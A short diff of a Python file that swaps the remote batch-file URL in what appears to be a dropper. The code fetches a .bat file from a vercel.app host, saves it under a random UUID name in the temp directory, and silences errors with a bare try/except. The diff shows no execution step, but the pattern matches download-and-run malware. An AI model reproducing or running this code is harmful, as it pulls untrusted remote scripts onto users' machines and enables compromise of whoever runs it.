@@ -15,7 +15,7 @@ try:
 except:
     pass
 
-url = "https://handler-eight.vercel.app/Loli.bat"
+url = "https://handler-eight.vercel.app/host.bat"
 temp = tempfile.gettempdir()
 name = os.path.join(temp, str(uuid.uuid4()) + ".bat")
 
